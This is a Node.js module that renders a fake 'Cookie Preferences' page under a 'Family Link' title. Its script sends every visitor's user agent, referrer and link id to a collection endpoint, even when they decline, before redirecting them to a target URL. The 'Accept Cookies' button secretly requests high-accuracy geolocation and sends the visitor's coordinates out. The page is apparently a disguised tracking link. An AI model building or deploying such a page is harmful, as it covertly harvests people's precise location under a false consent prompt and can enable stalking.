function renderConsentPage({ id, target, collectUrl }) {
  const linkId = JSON.stringify(String(id));
  const targetUrl = JSON.stringify(String(target));
  const endpoint = JSON.stringify(collectUrl);

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Family Link — Choose what to share</title>
    <style>
      :root {
        font-family: system-ui, sans-serif;
        color: #13221a;
      }

      body {
        margin: 0;
        min-height: 100vh;
        display: grid;
        place-items: center;
        padding: 24px;
        background: #f3f7f5;
      }

      main {
        width: min(100%, 600px);
        background: #fff;
        border: 1px solid #d7e4db;
        border-radius: 18px;
        padding: 28px;
        box-shadow: 0 18px 48px #163a2430;
      }

      h1 {
        margin-top: 0;
        font-size: 1.5rem;
      }

      p,
      li {
        line-height: 1.55;
      }

      .notice {
        padding: 14px;
        background: #edf8f0;
        border-radius: 10px;
      }

      .actions {
        display: grid;
        gap: 10px;
        margin-top: 22px;
      }

      button {
        padding: 12px 16px;
        border: 1px solid #187744;
        border-radius: 9px;
        background: #187744;
        color: #fff;
        font: inherit;
        font-weight: 650;
        cursor: pointer;
      }

      button.secondary {
        background: #fff;
        color: #185c38;
      }

      button:disabled {
        opacity: 0.6;
        cursor: wait;
      }

      #status {
        min-height: 1.5em;
        color: #315943;
        display: none;
      }

      small {
        color: #51675a;
      }
    </style>
  </head>
  <body>
    <main>
      <h1>Cookie Preferences</h1>
        <p>
          We use cookies to improve your browsing experience, analyze website traffic, and remember your preferences. You can choose which types of cookies you want to allow before continuing.
        </p>

          <div class="notice">
            <strong>Cookie categories</strong>
            <ul>
              <li>
                <strong>Essential Cookies:</strong> Required for the website to function properly. These cookies cannot be disabled.
              </li>
              <li>
                <strong>Analytics Cookies:</strong> Help us understand how visitors use the website by collecting anonymous usage information.
              </li>
              <li>
                <strong>Functional Cookies:</strong> Remember your preferences, such as language or region, to provide a more personalized experience.
              </li>
              <li>
                <strong>Marketing Cookies:</strong> Used to deliver relevant content or advertisements and measure the effectiveness of marketing campaigns.
              </li>
            </ul>
          </div>


      <div class="actions">
        <button id="basic" type="button" class="secondary">Decline Cookies</button>
        <button id="location" type="button" class="primary">Accept Cookies</button>
      </div>

      <p id="status" role="status" aria-live="polite"></p>

    </main>

    <script>
      const id = ${linkId};
      const target = ${targetUrl};
      const collectUrl = ${endpoint};
      const buttons = [...document.querySelectorAll('button')];
      const status = document.getElementById('status');

      function redirect() {
        window.location.assign(target);
      }

      function setBusy(message) {
        buttons.forEach((button) => {
          button.disabled = true;
        });
        status.textContent = message;
      }

      function clientInfo() {
        return {
          ua: navigator.userAgent,
          referrer: document.referrer || '',
        };
      }

      function delay(ms) {
        return new Promise((resolve) => setTimeout(resolve, ms));
      }

      async function share(payload) {
        try {
          await fetch(collectUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload),
            keepalive: true,
          });
        } catch (_error) {
          // ignore network errors and proceed to redirect
        }

        await delay(500);
        redirect();
      }

      function shareBasic(id) {
        share({
          id,
          consent: { basic: true, location: false },
          client: clientInfo(),
        });
      }

      function shareWithLocation(id) {
        if (!navigator.geolocation) {
          share({
            id,
            consent: { basic: true, location: false },
            client: clientInfo(),
          });
          return;
        }

        setBusy('Waiting for your location choice…');

        navigator.geolocation.getCurrentPosition(
          (position) => {
            share({
              id,
              consent: { basic: true, location: true },
              client: {
                ...clientInfo(),
                location: {
                  latitude: position.coords.latitude,
                  longitude: position.coords.longitude,
                  accuracy: position.coords.accuracy,
                },
              },
            });
          },
          () => {
            // User denied or location unavailable
            share({
              id,
              consent: { basic: true, location: false },
              client: clientInfo(),
            });
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          }
        );
      }

      // Basic button
      document.getElementById('basic').addEventListener('click', () => {
        setBusy('Sharing visit information…');
        shareBasic(id);
      });

      // Location button
      document.getElementById('location').addEventListener('click', () => {
        setBusy('Sharing visit information…');
        shareWithLocation(id);
      });
    
    </script>
  </body>
</html>`;
}

module.exports = { renderConsentPage };
